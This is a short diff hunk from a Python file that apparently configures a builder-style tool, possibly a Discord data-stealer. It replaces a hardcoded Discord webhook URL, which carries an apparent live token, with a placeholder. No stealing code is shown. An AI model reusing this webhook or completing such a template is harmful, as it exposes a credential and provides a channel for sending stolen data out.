@@ -23,7 +23,7 @@ from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
 
-__WEBHOOK_HERE__ = "https://discord.com/api/webhooks/1036700890872172625/aCHgrfLWBmPBMcFal1M5r0Ovxl-XB50D-DUJsHTRL2TvLhEz-LtgPw8ZD_wEYW6YpbOW"
+__WEBHOOK_HERE__ = "YOUR WEBHOOK HERE"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
